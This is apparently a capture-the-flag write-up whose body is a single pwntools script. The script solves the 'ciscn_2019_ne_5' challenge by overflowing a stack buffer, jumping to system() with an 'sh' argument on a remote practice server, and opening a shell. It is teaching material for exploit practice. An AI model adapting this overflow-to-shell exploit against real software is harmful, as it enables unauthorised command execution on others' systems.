+++
title = "ciscn_2019_ne_5  wp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['第一页']
draft = false
+++
```python
from pwn import *  
  
# p = process('./ne_5')  
p = remote("node5.buuoj.cn", 29898)  
sh = 0x80482ea  
sys_addr = 0x080484D0  
# 使用ROPgadget找  
p.sendlineafter("password:", b'administrator')  
p.sendlineafter(b'0.Exit\n:', b'1')  
  
payload = b'a' * (0x48 + 4) + p32(sys_addr) + b'aaaa' + p32(sh)  
# 使用system函数传参 同时用任意数据填充4个字节的返回地址  
p.sendlineafter(b'log info:', payload)  
  
p.sendlineafter(b'0.Exit\n:', b'4')  
p.interactive()
```
